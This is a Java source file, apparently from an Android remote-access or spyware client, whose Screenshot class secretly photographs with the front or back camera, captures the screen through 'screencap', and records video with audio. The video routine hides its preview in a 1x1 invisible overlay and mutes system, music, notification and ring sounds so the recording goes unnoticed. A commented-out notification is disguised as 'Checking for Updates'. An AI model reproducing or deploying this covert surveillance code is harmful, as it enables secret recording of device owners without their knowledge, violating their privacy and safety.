package com.ot.grhq.client.functionality;

import android.app.Activity;
import android.app.Notification;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.ImageFormat;
import android.graphics.Paint;
import android.view.Gravity;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.ot.grhq.client.R;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.ByteBuffer;

public class Screenshot {

    private static MediaProjection mediaProjection;
    private static ImageReader imageReader;

    /**
     *
     * @return
     */
    public static String captureImage(Context context, boolean frontCamera) {
        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";

        int whichCamera;
        if (frontCamera)
            whichCamera = Camera.CameraInfo.CAMERA_FACING_FRONT;
        else
            whichCamera = Camera.CameraInfo.CAMERA_FACING_BACK;

        Camera camera = Camera.open(whichCamera);
        SurfaceView view = new SurfaceView(context);

        try {
            SurfaceHolder holder = view.getHolder();
            camera.setPreviewDisplay(holder);
        } catch(IOException e) {}

        camera.startPreview();
        camera.takePicture(null, null, new Camera.PictureCallback() {

            public void onPictureTaken(byte[] data, Camera camera) {

                try (FileOutputStream stream = new FileOutputStream(filename)) {
                    stream.write(data);
                } catch (IOException e) {}
                camera.release();
                camera = null;
            }
        });

        return filename;
    }

    /**
     * Take screenshot of device
     * @return
     */
    public static String captureScreen(Context context) throws IOException, InterruptedException {
        String filename = context.getFilesDir() + "/" + String.valueOf(System.currentTimeMillis()) + ".png";
//        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
//
//        Bitmap screenshot = null;
//        try {
//            Display display = windowManager.getDefaultDisplay();
//            int screenWidth = display.getWidth();
//            int screenHeight = display.getHeight();
//            screenshot = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
//
//            Canvas canvas = new Canvas(screenshot);
//            // Get the root view of the current window and draw it onto the bitmap
////            View rootView = ((Activity) context).getWindow().getDecorView().getRootView();
////            rootView.draw(canvas);
//            Paint paint = new Paint();
//            paint.setAntiAlias(true);
//            paint.setFilterBitmap(true);
//            paint.setDither(true);
//
//            // Draw the screen content onto the bitmap
//            canvas.drawBitmap(screenshot, 0, 0, paint);
//
//            if (screenshot != null) {
//                File file = new File(context.getFilesDir(), filename);
//                FileOutputStream stream = new FileOutputStream(file);
//                screenshot.compress(Bitmap.CompressFormat.PNG, 100, stream);
//                stream.close();
//
//                return file.getAbsolutePath();
//            }
//        } catch (Exception e) {}


        ProcessBuilder processBuilder = new ProcessBuilder("screencap", filename);
        processBuilder.directory(new File(context.getFilesDir().toURI()));
        Process process = processBuilder.start();

        // Check for errors
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        String line;
        while ((line = errorReader.readLine()) != null) {
            Log.d("eeee",line);
        }

        // Wait for the command to complete
        int exitCode = process.waitFor();
        if (exitCode == 0)
            return filename;

        return null;
    }

    /**
     *
     * @param duration
     * @return
     */
    public static String captureVideo(Context context, int duration) throws IOException, InterruptedException {
//        Notification notification = new NotificationCompat.Builder(context,"channelid")
//                .setContentTitle("Checking for Updates")
//                .setContentText("Fetching")
//                .setSmallIcon(R.drawable.ic_launcher_foreground)
//                .setProgress(0,0,true)
//                .build();
//        startForeground(1234, notification);


        File outputDir = context.getFilesDir();
        File videoFile = null;

        try {
           videoFile = File.createTempFile(String.valueOf(System.currentTimeMillis()), ".mp4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
        }
        OutputStream outputStream = new FileOutputStream(videoFile);

        final Camera[] camera = {null};
        final MediaRecorder[] mediaRecorder = {null};
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        SurfaceView surfaceView = new SurfaceView(context);
        final WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_TOAST,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

        windowManager.addView(surfaceView, layoutParams);
        File finalVideoFile = videoFile;
        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder surfaceHolder) {

                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

                try {
                    camera[0] = Camera.open();
                } catch (Exception e) {

                    e.printStackTrace();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Failed to open camera\n".getBytes("UTF-8"));
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                    return;
                }


                mediaRecorder[0] = new MediaRecorder();
                camera[0].unlock();
                mediaRecorder[0].setPreviewDisplay(surfaceHolder.getSurface());
                mediaRecorder[0].setCamera(camera[0]);
                mediaRecorder[0].setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                mediaRecorder[0].setVideoSource(MediaRecorder.VideoSource.CAMERA);
                try {
                    mediaRecorder[0].setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));
                } catch (RuntimeException e) {
                    e.printStackTrace();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Error in Initialing Camera \n".getBytes("UTF-8"));
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                    return;
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mediaRecorder[0].setOutputFile(finalVideoFile);
                } else {
                    mediaRecorder[0].setOutputFile(finalVideoFile.getAbsolutePath());
                }

                try {
                    mediaRecorder[0].prepare();
                } catch (Exception e) {
                }
                mediaRecorder[0].start();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Started Recording Video\n".getBytes("UTF-8"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            @Override
            public void surfaceChanged(@NonNull SurfaceHolder holder, int format, int width, int height) {

            }

            @Override
            public void surfaceDestroyed(@NonNull SurfaceHolder holder) {
                if (mediaRecorder[0] != null) {
                    try {
                        mediaRecorder[0].stop();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    mediaRecorder[0].reset();
                    mediaRecorder[0].release();
                    mediaRecorder[0] = null;
                }

                if (camera[0] != null) {
                    camera[0].release();
                    camera[0] = null;
                }
            }
        });

        return videoFile.getAbsolutePath();
    }

    public static void cleanup(String path) {

    }
}
